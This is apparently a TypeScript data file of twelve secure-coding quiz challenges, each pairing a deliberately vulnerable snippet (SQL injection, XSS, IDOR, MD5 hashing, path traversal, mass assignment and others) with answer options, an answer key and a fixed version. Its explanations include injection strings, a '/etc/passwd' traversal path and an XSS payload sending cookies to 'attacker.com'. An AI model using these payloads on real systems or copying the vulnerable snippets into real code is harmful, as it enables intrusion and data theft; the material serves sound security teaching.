import { SecurityChallenge, SecurityTopic } from '../types/security';

export const SECURITY_TOPICS_META: Record<
  SecurityTopic,
  { label: string; description: string; owaspTag: string; icon: string }
> = {
  'sql-injection': {
    label: 'SQL Injection',
    description: 'Untrusted user inputs concatenated into database queries allowing unauthorized data access or modification.',
    owaspTag: 'OWASP A03:2025 - Injection',
    icon: 'Database',
  },
  'xss': {
    label: 'Cross-Site Scripting (XSS)',
    description: 'Unescaped user input rendered in the browser DOM, executing malicious client-side JavaScript.',
    owaspTag: 'OWASP A03:2025 - Injection',
    icon: 'Code',
  },
  'broken-access-control': {
    label: 'Broken Access Control',
    description: 'Flaws allowing users to act outside intended permissions, such as accessing other users’ private data (IDOR).',
    owaspTag: 'OWASP A01:2025 - Broken Access Control',
    icon: 'ShieldAlert',
  },
  'insecure-auth': {
    label: 'Insecure Authentication',
    description: 'Weak password hashing, missing rate limits, and vulnerable credential validation mechanisms.',
    owaspTag: 'OWASP A07:2025 - Authentication Failures',
    icon: 'KeyRound',
  },
  'hardcoded-secrets': {
    label: 'Hardcoded Secrets & API Keys',
    description: 'Private keys, tokens, or database credentials embedded directly into source code repositories.',
    owaspTag: 'OWASP A02:2025 - Cryptographic Failures',
    icon: 'Lock',
  },
  'input-validation': {
    label: 'Improper Input Validation',
    description: 'Accepting unvalidated user input such as file paths or raw parameters, enabling directory traversal and attacks.',
    owaspTag: 'OWASP A03:2025 - Validation Failures',
    icon: 'FileWarning',
  },
  'insecure-error-handling': {
    label: 'Insecure Error Handling',
    description: 'Leaking internal server stack traces, database schema details, or environment diagnostics to end users.',
    owaspTag: 'OWASP A05:2025 - Security Misconfiguration',
    icon: 'AlertOctagon',
  },
  'sensitive-data-exposure': {
    label: 'Sensitive Data Exposure',
    description: 'Exposing confidential fields (passwords, PII, reset tokens) in API responses or logs.',
    owaspTag: 'OWASP A02:2025 - Cryptographic Failures',
    icon: 'EyeOff',
  },
};

export const SECURITY_CHALLENGES: SecurityChallenge[] = [
  // 1. SQL Injection - Python / SQLite
  {
    id: 'sec-sqli-01',
    slug: 'python-sql-injection-authentication',
    title: 'Authentication Bypass via String Concatenation',
    topic: 'sql-injection',
    topicLabel: 'SQL Injection',
    owaspCategory: 'OWASP A03:2025 - Injection',
    cwe: 'CWE-89',
    difficulty: 'Beginner',
    language: 'python',
    estimatedMinutes: 4,
    scenario:
      'You are auditing a Python Flask application that verifies user login credentials against a relational database.',
    codeFilename: 'auth_service.py',
    codeSnippet: `def verify_user(username, password):
    # Retrieve user record by matching credentials directly in query
    query = f"SELECT id, role FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor = db.cursor()
    cursor.execute(query)
    user = cursor.fetchone()
    return user is not None`,
    question:
      'What vulnerability is present in this function, and how could an attacker exploit it?',
    options: [
      'Denial of Service because cursor.fetchone() blocks the database thread during high traffic.',
      'SQL Injection because raw string interpolation allows an attacker to supply "\' OR \'1\'=\'1" and bypass authentication.',
      'Cross-Site Request Forgery (CSRF) because the function does not validate the anti-CSRF token.',
      'Timing attack because string comparison does not run in constant time.'
    ],
    correctIndex: 1,
    explanation:
      'Using f-string formatting to concatenate user input directly into SQL statements creates a classic SQL Injection (CWE-89). If an attacker inputs username "\' OR \'1\'=\'1 --", the resulting query becomes `SELECT id, role FROM users WHERE username = \'\' OR \'1\'=\'1 -- ...`, which always evaluates to true, granting unauthorized access.',
    mitigation:
      'Always utilize parameterized queries or prepared statements. Parameter placeholders ensure the database driver treats user values strictly as data rather than executable SQL syntax.',
    secureCodeFilename: 'auth_service_secure.py',
    secureCode: `import bcrypt

def verify_user_secure(username, password):
    # Use parameterized query to prevent SQL syntax injection
    query = "SELECT id, password_hash, role FROM users WHERE username = ?"
    cursor = db.cursor()
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    
    if not user:
        return False
        
    # Safely verify bcrypt password hash
    return bcrypt.checkpw(password.encode('utf-8'), user['password_hash'].encode('utf-8'))`,
    secureCodeExplanation:
      'The query parameters are passed as a tuple `(username,)` to the database driver rather than concatenated into the query string. Additionally, passwords should be stored and checked using salted password hashes (e.g., bcrypt) rather than compared in plaintext in SQL.'
  },

  // 2. SQL Injection - Dynamic Ordering
  {
    id: 'sec-sqli-02',
    slug: 'node-dynamic-order-by-injection',
    title: 'SQL Injection via Dynamic ORDER BY Clause',
    topic: 'sql-injection',
    topicLabel: 'SQL Injection',
    owaspCategory: 'OWASP A03:2025 - Injection',
    cwe: 'CWE-89',
    difficulty: 'Intermediate',
    language: 'javascript',
    estimatedMinutes: 5,
    scenario:
      'A Node.js REST API allows clients to sort a list of products by passing a query parameter `sortBy` (e.g., `/products?sortBy=price`).',
    codeFilename: 'productController.js',
    codeSnippet: `app.get('/products', async (req, res) => {
  const sortBy = req.query.sortBy || 'created_at';
  
  // Developer attempted parameterized query for limit, but concatenated sortBy
  const query = \`SELECT id, name, price FROM products ORDER BY \${sortBy} ASC LIMIT $1\`;
  const result = await pool.query(query, [10]);
  
  res.json(result.rows);
});`,
    question:
      'Standard parameter placeholders ($1, ?) cannot parameterize column or table names in SQL. What is the safest way to prevent injection in dynamic ORDER BY clauses?',
    options: [
      'Filter out the single-quote character (\') with regex before concatenating the parameter.',
      'Encode the sortBy parameter with encodeURIComponent() before running the query.',
      'Validate sortBy against a strict whitelist of permitted column names, falling back to a safe default if invalid.',
      'Wrap the sortBy parameter inside a base64 decoder on the database layer.'
    ],
    correctIndex: 2,
    explanation:
      'Database engines do not allow SQL identifiers (column names, table names, ASC/DESC keywords) to be parameterized using standard placeholders like `$1`. Relying on blacklist filtering often fails. The robust, industry-standard mitigation is a strict whitelist of known safe column identifiers.',
    mitigation:
      'Implement an explicit whitelist map of permitted column names. If user input does not strictly match one of the whitelisted keys, reject the input or default to a safe value.',
    secureCodeFilename: 'productController_secure.js',
    secureCode: `const ALLOWED_SORT_COLUMNS = {
  price: 'price',
  name: 'name',
  date: 'created_at'
};

app.get('/products', async (req, res) => {
  const requestedSort = req.query.sortBy;
  // Strictly map to an allowed column; default to 'created_at' if invalid
  const safeSortColumn = ALLOWED_SORT_COLUMNS[requestedSort] || 'created_at';
  
  const query = \`SELECT id, name, price FROM products ORDER BY \${safeSortColumn} ASC LIMIT $1\`;
  const result = await pool.query(query, [10]);
  
  res.json(result.rows);
});`,
    secureCodeExplanation:
      '`ALLOWED_SORT_COLUMNS` serves as an immutable dictionary. Any unexpected input from `req.query.sortBy` is discarded, making SQL injection impossible.'
  },

  // 3. Cross-Site Scripting (XSS) - DOM XSS in JavaScript
  {
    id: 'sec-xss-01',
    slug: 'dom-based-xss-innerhtml',
    title: 'DOM-Based XSS via Unescaped innerHTML',
    topic: 'xss',
    topicLabel: 'Cross-Site Scripting (XSS)',
    owaspCategory: 'OWASP A03:2025 - Injection',
    cwe: 'CWE-79',
    difficulty: 'Beginner',
    language: 'javascript',
    estimatedMinutes: 4,
    scenario:
      'A frontend widget reads a search keyword from the URL query string and displays a greeting message on the page.',
    codeFilename: 'searchWidget.js',
    codeSnippet: `function displaySearchResults() {
  const urlParams = new URLSearchParams(window.location.search);
  const searchTerm = urlParams.get('q');
  
  const container = document.getElementById('search-banner');
  if (searchTerm && container) {
    // Render the search keyword into the container
    container.innerHTML = "<h3>Results for: " + searchTerm + "</h3>";
  }
}`,
    question:
      'Why is using innerHTML vulnerable here, and what is the best native browser API to fix it?',
    options: [
      'It causes memory leaks in modern browsers; fix it by wrapping it in a setTimeout() loop.',
      'If q contains `<img src=x onerror=alert(document.cookie)>`, it executes as malicious script; fix it using textContent.',
      'It violates the CORS policy; fix it by adding an Access-Control-Allow-Origin header in the frontend script.',
      'It slows down DOM rendering; fix it by using document.write() instead.'
    ],
    correctIndex: 1,
    explanation:
      'Assigning unsanitized user input to `element.innerHTML` causes the browser HTML parser to parse and execute HTML tags and inline event handlers (e.g., `<img src=x onerror=...>`). Using `textContent` ensures that strings are treated strictly as plain text characters, automatically preventing HTML execution.',
    mitigation:
      'Avoid `innerHTML` when inserting user-controllable text. Use `textContent` or `innerText`, or utilize a battle-tested sanitizer library like DOMPurify when markup is genuinely required.',
    secureCodeFilename: 'searchWidget_secure.js',
    secureCode: `function displaySearchResultsSecure() {
  const urlParams = new URLSearchParams(window.location.search);
  const searchTerm = urlParams.get('q');
  
  const container = document.getElementById('search-banner');
  if (searchTerm && container) {
    // Clear existing children
    container.replaceChildren();
    
    // Create elements and assign safe plain text
    const heading = document.createElement('h3');
    heading.textContent = \`Results for: \${searchTerm}\`;
    container.appendChild(heading);
  }
}`,
    secureCodeExplanation:
      'Creating an `h3` element and setting `heading.textContent` ensures any HTML entities or script tags in `searchTerm` are rendered as inert text glyphs without execution.'
  },

  // 4. Broken Access Control - IDOR
  {
    id: 'sec-bac-01',
    slug: 'insecure-direct-object-reference-invoice',
    title: 'Insecure Direct Object Reference (IDOR) in API Endpoint',
    topic: 'broken-access-control',
    topicLabel: 'Broken Access Control',
    owaspCategory: 'OWASP A01:2025 - Broken Access Control',
    cwe: 'CWE-639',
    difficulty: 'Intermediate',
    language: 'javascript',
    estimatedMinutes: 5,
    scenario:
      'An e-commerce backend provides an endpoint for customers to download PDF invoices by passing the invoice ID.',
    codeFilename: 'invoiceRoute.js',
    codeSnippet: `// GET /api/invoices/:id
app.get('/api/invoices/:id', authenticateUser, async (req, res) => {
  const invoiceId = req.params.id;
  
  // Query database for invoice record
  const invoice = await db.invoices.findById(invoiceId);
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  // Sends invoice data directly
  res.json(invoice);
});`,
    question:
      'Even though the user is authenticated with `authenticateUser`, what critical security flaw exists in this handler?',
    options: [
      'The route lacks HTTPS enforcement on the Express server.',
      'Missing object-level authorization: any authenticated user can view any other user’s invoice simply by guessing the invoice ID.',
      'The response returns JSON instead of binary PDF stream, causing a buffer overflow.',
      'req.params.id must always be an integer rather than a string.'
    ],
    correctIndex: 1,
    explanation:
      'Authentication only verifies *who* the user is; authorization checks *what* they are allowed to access. Because the code queries by `invoiceId` without validating that `invoice.userId === req.user.id` (or that the user is an admin), any logged-in user can increment the ID and harvest invoices belonging to other customers (CWE-639 / IDOR).',
    mitigation:
      'Enforce strict record-level authorization. Include the authenticated user’s ID in the query filter or verify ownership before returning data.',
    secureCodeFilename: 'invoiceRoute_secure.js',
    secureCode: `// GET /api/invoices/:id
app.get('/api/invoices/:id', authenticateUser, async (req, res) => {
  const invoiceId = req.params.id;
  const currentUserId = req.user.id;
  
  // Scope the lookup to the authenticated user's ownership
  const invoice = await db.invoices.findOne({
    id: invoiceId,
    userId: currentUserId
  });
  
  if (!invoice) {
    // Return 404 to avoid leaking whether the ID exists for another user
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});`,
    secureCodeExplanation:
      'The database query filters by both `id` and `userId: currentUserId`. This guarantees that users can only ever retrieve their own records.'
  },

  // 5. Insecure Authentication Practices - Password Hashing
  {
    id: 'sec-auth-01',
    slug: 'weak-password-hashing-md5',
    title: 'Insecure Password Storage with MD5 Hash',
    topic: 'insecure-auth',
    topicLabel: 'Insecure Authentication',
    owaspCategory: 'OWASP A07:2025 - Authentication Failures',
    cwe: 'CWE-916',
    difficulty: 'Beginner',
    language: 'python',
    estimatedMinutes: 4,
    scenario:
      'You are reviewing a legacy user registration module in Python that hashes passwords before persisting them to the database.',
    codeFilename: 'registration.py',
    codeSnippet: `import hashlib

def register_user(username, password):
    # Store user with hashed password
    password_hash = hashlib.md5(password.encode('utf-8')).hexdigest()
    
    db.execute(
        "INSERT INTO users (username, password_hash) VALUES (?, ?)",
        (username, password_hash)
    )`,
    question:
      'Why is using standard hashlib.md5() dangerous for storing user passwords?',
    options: [
      'MD5 output is too large to fit in standard VARCHAR database columns.',
      'MD5 is an extremely fast, unsalted general hash; attackers can reverse billions of hashes per second using precomputed rainbow tables.',
      'MD5 hashes cannot be decrypted by the server when the user forgets their password.',
      'MD5 requires root permissions on Linux servers to compute.'
    ],
    correctIndex: 1,
    explanation:
      'Fast general-purpose cryptographic hash functions like MD5 and SHA-1 are unsuitable for passwords. Because MD5 is computationally trivial and this implementation lacks a per-user cryptographically random salt, attackers with a leaked database dump can crack common passwords almost instantaneously using rainbow tables and modern GPU clusters.',
    mitigation:
      'Use slow, memory-hard, salted key-derivation algorithms such as Argon2id, bcrypt, or PBKDF2 with an appropriate computational work factor.',
    secureCodeFilename: 'registration_secure.py',
    secureCode: `import bcrypt

def register_user_secure(username, password):
    # Generate a unique cryptographic salt and compute bcrypt hash (work factor 12)
    salt = bcrypt.gensalt(rounds=12)
    password_hash = bcrypt.hashpw(password.encode('utf-8'), salt)
    
    db.execute(
        "INSERT INTO users (username, password_hash) VALUES (?, ?)",
        (username, password_hash.decode('utf-8'))
    )`,
    secureCodeExplanation:
      'bcrypt automatically incorporates a unique random salt and an adjustable work factor (rounds=12). This makes brute-force dictionary attacks millions of times slower and completely invalidates precomputed rainbow tables.'
  },

  // 6. Hardcoded Secrets and API Keys
  {
    id: 'sec-secret-01',
    slug: 'hardcoded-stripe-private-key',
    title: 'Hardcoded Payment Gateway Secret Key',
    topic: 'hardcoded-secrets',
    topicLabel: 'Hardcoded Secrets & API Keys',
    owaspCategory: 'OWASP A02:2025 - Cryptographic Failures',
    cwe: 'CWE-798',
    difficulty: 'Beginner',
    language: 'javascript',
    estimatedMinutes: 3,
    scenario:
      'A software developer created a Stripe checkout integration and committed the initialization file to a public Git repository.',
    codeFilename: 'paymentService.js',
    codeSnippet: `const Stripe = require('stripe');

// Initialize Stripe payment client with secret key
const stripe = new Stripe('sk_live_51M0...99xYQZ_PROD_SECRET_KEY_LIVE');

async function processPayment(amount, customerId) {
  return await stripe.charges.create({
    amount,
    currency: 'usd',
    customer: customerId,
  });
}`,
    question:
      'What is the primary risk of embedding the live secret key directly into the code, and how should it be managed?',
    options: [
      'The secret key causes the Node.js runtime to consume excessive CPU cycles; store it in a public JSON file.',
      'Anyone with read access to the repository can steal the key and perform unauthorized financial transactions; load it via secure environment variables.',
      'Stripe rejects keys that are not hardcoded inside the JavaScript bundle.',
      'The key will expire after 24 hours if not refreshed through an HTTP cookie.'
    ],
    correctIndex: 1,
    explanation:
      'Hardcoding secrets in source files exposes them to anyone with repository access, CI/CD logs, or commit histories (CWE-798). Automated scraping bots scan public commits within seconds of push to compromise live API credentials. Secrets must be supplied externally via environment variables or a secrets manager.',
    mitigation:
      'Load sensitive API keys from externalized environment variables (`process.env.STRIPE_SECRET_KEY`), ensure `.env` is listed in `.gitignore`, and use secret scanning tools in CI/CD.',
    secureCodeFilename: 'paymentService_secure.js',
    secureCode: `const Stripe = require('stripe');

// Validate that required secret is injected via environment variables
const secretKey = process.env.STRIPE_SECRET_KEY;
if (!secretKey) {
  throw new Error('FATAL: STRIPE_SECRET_KEY environment variable is not configured');
}

const stripe = new Stripe(secretKey);

async function processPayment(amount, customerId) {
  return await stripe.charges.create({
    amount,
    currency: 'usd',
    customer: customerId,
  });
}`,
    secureCodeExplanation:
      'The secret key is read from `process.env.STRIPE_SECRET_KEY`. If the environment variable is missing in production, the service fails fast with an explicit error rather than exposing sensitive credentials in code.'
  },

  // 7. Improper Input Validation - Path Traversal
  {
    id: 'sec-val-01',
    slug: 'path-traversal-file-download',
    title: 'Arbitrary File Read via Path Traversal',
    topic: 'input-validation',
    topicLabel: 'Improper Input Validation',
    owaspCategory: 'OWASP A03:2025 - Validation Failures',
    cwe: 'CWE-22',
    difficulty: 'Intermediate',
    language: 'python',
    estimatedMinutes: 5,
    scenario:
      'A web application lets users view public report documents by providing a file name parameter via HTTP (e.g. `GET /download?file=annual_report.pdf`).',
    codeFilename: 'report_viewer.py',
    codeSnippet: `import os
from flask import Flask, request, send_file

app = Flask(__name__)
REPORTS_DIR = '/var/app/public_reports'

@app.route('/download')
def download_report():
    filename = request.args.get('file')
    # Join the base reports directory with the user-supplied filename
    filepath = os.path.join(REPORTS_DIR, filename)
    return send_file(filepath)`,
    question:
      'How can an attacker exploit this endpoint, and what is the underlying vulnerability?',
    options: [
      'They can flood the server with large files causing buffer overflow.',
      'By passing `../../../../etc/passwd` or `../../app/.env` as the filename, they can escape the reports directory and read arbitrary system files.',
      'They can execute remote arbitrary shell commands by appending a semicolon (;) to the filename.',
      'They can bypass SSL certificate verification on the client.'
    ],
    correctIndex: 1,
    explanation:
      'When `os.path.join` receives path components containing `..` (dot-dot-slash), it resolves directory traversal sequences relative to the base directory. An attacker can request `/download?file=../../../../etc/passwd` to read sensitive configuration and operating system files (CWE-22 Path Traversal).',
    mitigation:
      'Resolve the canonical path with `os.path.realpath` and verify that the target path strictly starts with the authorized base directory prefix, or use safe file lookup mappings.',
    secureCodeFilename: 'report_viewer_secure.py',
    secureCode: `import os
from flask import Flask, request, send_file, abort

app = Flask(__name__)
REPORTS_DIR = os.path.realpath('/var/app/public_reports')

@app.route('/download')
def download_report_secure():
    filename = request.args.get('file', '')
    
    # Strip path separators to get only the base filename
    safe_basename = os.path.basename(filename)
    target_path = os.path.realpath(os.path.join(REPORTS_DIR, safe_basename))
    
    # Ensure resolved path is strictly within the allowed directory
    if not target_path.startswith(REPORTS_DIR) or not os.path.isfile(target_path):
        abort(404)
        
    return send_file(target_path)`,
    secureCodeExplanation:
      '`os.path.basename` strips out any directory traversals (`../`), and `os.path.realpath` with `startswith(REPORTS_DIR)` guarantees that no file outside `/var/app/public_reports` can ever be read.'
  },

  // 8. Insecure Error Handling - Stack Trace Leakage
  {
    id: 'sec-err-01',
    slug: 'express-stack-trace-leakage',
    title: 'Internal Stack Trace & Database Error Leakage',
    topic: 'insecure-error-handling',
    topicLabel: 'Insecure Error Handling',
    owaspCategory: 'OWASP A05:2025 - Security Misconfiguration',
    cwe: 'CWE-209',
    difficulty: 'Beginner',
    language: 'javascript',
    estimatedMinutes: 4,
    scenario:
      'An Express.js API handles database errors during user registration and returns error details to the frontend client.',
    codeFilename: 'errorHandler.js',
    codeSnippet: `app.post('/api/users', async (req, res) => {
  try {
    const user = await db.insertUser(req.body);
    res.status(201).json(user);
  } catch (err) {
    // Return detailed error diagnostics to client
    res.status(500).json({
      success: false,
      message: err.message,
      stack: err.stack,
      sqlQuery: err.sql,
      dbHost: process.env.DB_HOST
    });
  }
});`,
    question:
      'Why is returning `err.stack` and `err.sql` in production API responses dangerous?',
    options: [
      'It breaks the HTTP/2 specification because error JSON payloads must be under 128 bytes.',
      'It leaks database schema, server filesystem paths, internal component versions, and network topology to attackers.',
      'It automatically grants write permissions on the database to anyone who receives the 500 status code.',
      'It prevents the server from restarting after an uncaught exception.'
    ],
    correctIndex: 1,
    explanation:
      'Leaking detailed error messages, internal file paths, stack traces, and raw SQL queries (CWE-209) provides attackers with precise reconnaissance data. It reveals table names, column structures, database vendors, and library versions, allowing attackers to craft targeted exploits against known vulnerabilities.',
    mitigation:
      'Log detailed diagnostics and stack traces securely to internal monitoring systems with a unique correlation ID. Return only an opaque, generic error message to external callers.',
    secureCodeFilename: 'errorHandler_secure.js',
    secureCode: `const crypto = require('crypto');

app.post('/api/users', async (req, res) => {
  try {
    const user = await db.insertUser(req.body);
    res.status(201).json(user);
  } catch (err) {
    // Generate unique error correlation tracking ID
    const errorId = crypto.randomUUID();
    
    // Log full diagnostics internally to secure server logger
    logger.error('User creation failed', {
      errorId,
      error: err.message,
      stack: err.stack,
      sql: err.sql
    });
    
    // Return generic, sanitized response to client
    res.status(500).json({
      success: false,
      error: 'An internal server error occurred. Please contact support.',
      errorId // Client can provide this ID to customer support
    });
  }
});`,
    secureCodeExplanation:
      'Internal stack traces and database queries are logged on the server. The client only sees a friendly generic message and an `errorId` for customer support reference.'
  },

  // 9. Sensitive Data Exposure - API Serialization Leak
  {
    id: 'sec-sde-01',
    slug: 'user-profile-sensitive-data-leak',
    title: 'Sensitive Data Exposure in User Profile Endpoint',
    topic: 'sensitive-data-exposure',
    topicLabel: 'Sensitive Data Exposure',
    owaspCategory: 'OWASP A02:2025 - Cryptographic Failures',
    cwe: 'CWE-200',
    difficulty: 'Beginner',
    language: 'javascript',
    estimatedMinutes: 4,
    scenario:
      'A social coding platform allows users to view public user profiles at `/api/users/:username`.',
    codeFilename: 'userController.js',
    codeSnippet: `app.get('/api/users/:username', async (req, res) => {
  const username = req.params.username;
  
  // Find full user record in database
  const user = await db.users.findOne({ username });
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  // Serialize entire database record directly to JSON
  res.json(user);
});`,
    question:
      'If the `users` table contains columns `password_hash`, `two_factor_secret`, `email`, and `ssn`, what is the security defect in this code?',
    options: [
      'The endpoint does not compress the JSON payload with gzip.',
      'Mass assignment vulnerability: incoming parameters overwrite existing database rows.',
      'Sensitive Data Exposure (CWE-200): internal security fields and PII are serialized directly into the public response.',
      'The response is sent over HTTP/1.1 instead of WebSockets.'
    ],
    correctIndex: 2,
    explanation:
      'Directly serializing raw database models to the client (CWE-200 / Sensitive Data Exposure) frequently exposes private attributes such as password hashes, two-factor authentication backup keys, email addresses, or SSNs. Even if a frontend UI does not display these fields, they remain inspectable in HTTP network responses.',
    mitigation:
      'Explicitly project or map database records into safe Data Transfer Objects (DTOs) with a strict whitelist of fields approved for public exposure.',
    secureCodeFilename: 'userController_secure.js',
    secureCode: `app.get('/api/users/:username', async (req, res) => {
  const username = req.params.username;
  
  // Project only explicitly allowed public fields from database
  const user = await db.users.findOne(
    { username },
    { projection: { id: 1, username: 1, displayName: 1, bio: 1, avatarUrl: 1, _id: 0 } }
  );
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  // Return safe public DTO
  res.json({
    id: user.id,
    username: user.username,
    displayName: user.displayName,
    bio: user.bio,
    avatarUrl: user.avatarUrl
  });
});`,
    secureCodeExplanation:
      'The query and serializer both enforce an explicit whitelist of safe public properties (`id`, `username`, `displayName`, `bio`, `avatarUrl`), ensuring sensitive security fields are never exposed.'
  },

  // 10. Broken Access Control - Role Elevation via Mass Assignment
  {
    id: 'sec-bac-02',
    slug: 'mass-assignment-privilege-elevation',
    title: 'Privilege Elevation via Mass Assignment',
    topic: 'broken-access-control',
    topicLabel: 'Broken Access Control',
    owaspCategory: 'OWASP A01:2025 - Broken Access Control',
    cwe: 'CWE-915',
    difficulty: 'Advanced',
    language: 'javascript',
    estimatedMinutes: 6,
    scenario:
      'A user settings page allows members to update their profile bio and avatar. The backend handler updates the database using the request body.',
    codeFilename: 'profileUpdate.js',
    codeSnippet: `// PUT /api/profile
app.put('/api/profile', authenticateUser, async (req, res) => {
  const userId = req.user.id;
  
  // Directly unpack the incoming request body into the update query
  await db.users.updateOne(
    { id: userId },
    { $set: req.body }
  );
  
  res.json({ success: true, message: 'Profile updated' });
});`,
    question:
      'How can a regular user elevate their privileges to Administrator through this endpoint?',
    options: [
      'By sending a request with an empty body to crash the database server.',
      'By sending JSON containing `{"role": "admin", "isVerified": true}`, which overwrites sensitive model attributes.',
      'By changing their HTTP User-Agent header to "Administrator/1.0".',
      'By sending a PUT request transformed into an OPTIONS preflight.'
    ],
    correctIndex: 1,
    explanation:
      'Mass assignment (CWE-915) occurs when software automatically binds client-supplied HTTP parameters to database models without filtering. An attacker can inspect the client or guess sensitive model attributes and send `{"role": "admin", "is_admin": true, "balance": 99999}`, overwriting protected fields.',
    mitigation:
      'Use a strict property whitelist to extract only the parameters users are legitimately authorized to edit, or use schema validation (e.g. Zod).',
    secureCodeFilename: 'profileUpdate_secure.js',
    secureCode: `// PUT /api/profile
app.put('/api/profile', authenticateUser, async (req, res) => {
  const userId = req.user.id;
  
  // Strict whitelist extraction - only permitted fields are accepted
  const { bio, avatarUrl, website } = req.body;
  const safeUpdates = {};
  
  if (typeof bio === 'string') safeUpdates.bio = bio.slice(0, 500);
  if (typeof avatarUrl === 'string') safeUpdates.avatarUrl = avatarUrl;
  if (typeof website === 'string') safeUpdates.website = website;
  
  await db.users.updateOne(
    { id: userId },
    { $set: safeUpdates }
  );
  
  res.json({ success: true, message: 'Profile updated successfully' });
});`,
    secureCodeExplanation:
      'Only `bio`, `avatarUrl`, and `website` are extracted and validated. Attempted updates to `role`, `isAdmin`, or other sensitive fields in `req.body` are silently ignored.'
  },

  // 11. Cross-Site Scripting (XSS) - Template Injection / Raw HTML in React
  {
    id: 'sec-xss-02',
    slug: 'react-dangerouslysetinnerhtml-xss',
    title: 'Stored XSS via dangerouslySetInnerHTML in React',
    topic: 'xss',
    topicLabel: 'Cross-Site Scripting (XSS)',
    owaspCategory: 'OWASP A03:2025 - Injection',
    cwe: 'CWE-79',
    difficulty: 'Intermediate',
    language: 'javascript',
    estimatedMinutes: 5,
    scenario:
      'A markdown comments feed in a React web application renders rich user-submitted comments.',
    codeFilename: 'CommentViewer.jsx',
    codeSnippet: `export function CommentViewer({ comment }) {
  // Convert markdown to HTML on frontend
  const rawHtml = parseMarkdown(comment.body);
  
  return (
    <div className="comment-card">
      <span className="author">{comment.author}</span>
      {/* Rendering raw parsed markdown string */}
      <div dangerouslySetInnerHTML={{ __html: rawHtml }} />
    </div>
  );
}`,
    question:
      'If parseMarkdown does not sanitize HTML, how should the application protect against XSS before passing HTML to dangerouslySetInnerHTML?',
    options: [
      'Pass the string through encodeURI() before rendering.',
      'Sanitize the HTML using a dedicated HTML sanitization library (such as DOMPurify) before injecting it into dangerouslySetInnerHTML.',
      'Wrap the div inside an HTML5 `<noscript>` container.',
      'Add the attribute `crossorigin="anonymous"` to the parent element.'
    ],
    correctIndex: 1,
    explanation:
      '`dangerouslySetInnerHTML` bypasses React’s built-in XSS protections. If user comments contain malicious payloads like `<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">`, any user viewing the comment will execute the malicious script. Sanitizing with DOMPurify strips dangerous tags and attributes while preserving safe formatting.',
    mitigation:
      'Always sanitize HTML strings with DOMPurify (`DOMPurify.sanitize(rawHtml)`) before injecting into `dangerouslySetInnerHTML`.',
    secureCodeFilename: 'CommentViewer_secure.jsx',
    secureCode: `import DOMPurify from 'dompurify';

export function CommentViewerSecure({ comment }) {
  const rawHtml = parseMarkdown(comment.body);
  
  // Sanitize the HTML to strip any script tags or event handlers
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'code', 'pre', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target']
  });
  
  return (
    <div className="comment-card">
      <span className="author">{comment.author}</span>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}`,
    secureCodeExplanation:
      '`DOMPurify.sanitize()` removes executable JavaScript, malicious event handlers (`onerror`, `onload`), and unauthorized tags before insertion into the DOM.'
  },

  // 12. Insecure Authentication - Timing Attacks on Tokens
  {
    id: 'sec-auth-02',
    slug: 'timing-attack-webhook-signature',
    title: 'Timing Attack in Webhook Signature Verification',
    topic: 'insecure-auth',
    topicLabel: 'Insecure Authentication',
    owaspCategory: 'OWASP A07:2025 - Authentication Failures',
    cwe: 'CWE-208',
    difficulty: 'Advanced',
    language: 'python',
    estimatedMinutes: 6,
    scenario:
      'A payment processing service verifies incoming HMAC webhook signatures to authenticate that requests originated from the payment gateway.',
    codeFilename: 'webhook_auth.py',
    codeSnippet: `import hmac
import hashlib

def verify_webhook(raw_payload, received_signature, secret_key):
    # Compute expected HMAC-SHA256 signature
    expected = hmac.new(
        secret_key.encode('utf-8'),
        raw_payload.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    # Check signature using standard equality operator
    return received_signature == expected`,
    question:
      'Why is using standard string equality (`received_signature == expected`) vulnerable, and what is the proper solution?',
    options: [
      'Standard string equality converts strings to lower case, causing false positives.',
      'It evaluates character-by-character and returns early on the first mismatch, enabling attackers to guess signatures byte-by-byte via timing differences.',
      'It stores the expected signature in unencrypted RAM swap space.',
      'It throws a TypeError if the payload contains Unicode emojis.'
    ],
    correctIndex: 1,
    explanation:
      'Standard `==` comparison terminates as soon as the first mismatching byte is encountered. An attacker measuring microscopic network latency variations (timing attack / CWE-208) can determine whether each guess starts with the correct character, systematically reconstructing valid cryptographic signatures.',
    mitigation:
      'Use a constant-time comparison algorithm such as `hmac.compare_digest` in Python or `crypto.timingSafeEqual` in Node.js, which takes the exact same duration regardless of where differences occur.',
    secureCodeFilename: 'webhook_auth_secure.py',
    secureCode: `import hmac
import hashlib

def verify_webhook_secure(raw_payload, received_signature, secret_key):
    expected = hmac.new(
        secret_key.encode('utf-8'),
        raw_payload.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    # Use constant-time comparison to prevent timing attacks
    return hmac.compare_digest(received_signature, expected)`,
    secureCodeExplanation:
      '`hmac.compare_digest()` compares strings in constant time regardless of where differences lie, rendering timing analysis impossible.'
  }
];
